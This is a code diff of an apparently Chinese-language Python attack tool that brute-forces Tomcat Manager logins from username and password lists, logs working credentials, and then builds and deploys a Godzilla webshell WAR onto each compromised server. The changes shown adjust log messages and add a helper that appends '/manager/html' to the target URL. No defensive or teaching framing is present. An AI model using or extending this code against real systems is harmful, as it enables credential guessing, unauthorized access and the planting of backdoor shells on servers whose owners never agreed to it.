@@ -74,7 +74,6 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
         cookies = response.cookies
         jsessionid = cookies.get('JSESSIONID')
         if not jsessionid:
-            logger.warning(f"{Fore.YELLOW}[!] 未能获取 JSESSIONID {login_url} {Style.RESET_ALL}")
             return None, None, None, False
 
         # 使用 BeautifulSoup 解析 HTML 并提取 CSRF_NONCE 和文件上传字段名
@@ -90,7 +89,7 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
 
         return jsessionid, csrf_nonce, file_field_name, True
     except requests.exceptions.RequestException as e:
-        logger.warning(f"{Fore.YELLOW}[!] 错误在get_jsessionid_and_csrf_nonce {url}: {str(e)}{Style.RESET_ALL}")
+        logger.warning(f"{Fore.YELLOW}[!] 网络错误 {url}: {str(e)}{Style.RESET_ALL}")
         return None, None, None, False
 
 # 部署 Godzilla Webshell 并尝试访问上传的 Webshell
@@ -129,7 +128,7 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
                 logger.warning(f"{Fore.YELLOW}[!] 获取 Webshell 失败: {shell_url} {Style.RESET_ALL}")
             break   # 成功后退出循环
         except requests.exceptions.RequestException as e:
-            logger.warning(f"{Fore.YELLOW}[!] 错误在deploy_godzilla_war {url}: {str(e)}{Style.RESET_ALL}")
+            logger.warning(f"{Fore.YELLOW}[!] 网站访问失败 {url}: {str(e)}{Style.RESET_ALL}")
 
         attempt += 1
         if attempt < max_retries:
@@ -145,14 +144,19 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
 
 # 弱口令检测函数
 def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
+    base_url = url.rstrip('/')
+    if not base_url.endswith('/manager/html'):
+        url_with_path = f"{base_url}/manager/html"
+    else:
+        url_with_path = url
     attempt = 0
     while attempt < max_retries:
         try:
             for username in usernames:
                 for password in passwords:
-                    response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=10, verify=False)
+                    response = requests.get(url_with_path, auth=HTTPBasicAuth(username, password), timeout=10, verify=False)
                     if response.status_code == 200:
-                        success_entry = f"{url} {username}:{password}"
+                        success_entry = f"{url_with_path} {username}:{password}"
                         logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
                         with open(output_file, 'a', encoding='utf-8') as f:
                             f.write(success_entry + "\n")
@@ -161,22 +165,22 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
                         war_file_name, random_string, shell_file_name = generate_war(config)
                         if war_file_name:
                             # 部署 Godzilla WAR 包并尝试获取 shell
-                            deploy_godzilla_war(url, username, password, war_file_name, random_string, shell_file_name,
+                            deploy_godzilla_war(url_with_path, username, password, war_file_name, random_string, shell_file_name,
                                                 output_file,
                                                 config['retry']['deploy_godzilla_war']['max_retries'],
                                                 config['retry']['deploy_godzilla_war']['retry_delay'])
-                        return (url, username, password)
+                        return (url_with_path, username, password)
                     else:
                         logger.info(
-                            f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url}{Style.RESET_ALL}")
+                            f"{Fore.GREEN}[-] 失败: {username}:{password} {Fore.WHITE}({response.status_code}) {Fore.BLUE}{url_with_path}{Style.RESET_ALL}")
             break    # 如果检查完所有用户密码对则退出循环
         except requests.exceptions.RequestException as e:
             logger.warning(
-                f"{Fore.YELLOW}[!] 网站无法访问 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
+                f"{Fore.YELLOW}[!] 网站无法访问 {url_with_path} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
             time.sleep(retry_delay)   # 重试前等待
             attempt += 1
     if attempt == max_retries:
-        logger.error(f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
+        logger.error(f"{Fore.CYAN}[*] 最大重试次数已达，无法访问 {url_with_path}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
         return None  # 返回 None 表示该 URL 无法访问
 
     return url, None, None
@@ -274,7 +278,6 @@ def main():
 
     # 验证配置文件
     if not validate_config(config):
-        logger.error("配置文件验证失败")
         return
 
     # 加载 URL、用户名和密码文件
